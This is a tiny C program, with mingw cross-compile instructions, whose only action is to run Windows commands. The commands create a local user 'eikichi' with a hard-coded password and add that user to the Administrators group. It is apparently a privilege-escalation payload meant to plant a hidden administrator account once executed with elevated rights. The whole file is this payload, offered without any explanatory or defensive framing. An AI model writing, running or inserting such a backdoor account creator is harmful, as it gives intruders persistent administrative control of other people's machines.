// sudo apt install mingw-w64;  x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
// modify Administrators/Administrateurs
#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user eikichi Password123! /add");
  i = system ("net localgroup administrators eikichi /add");
  
  return 0;
}
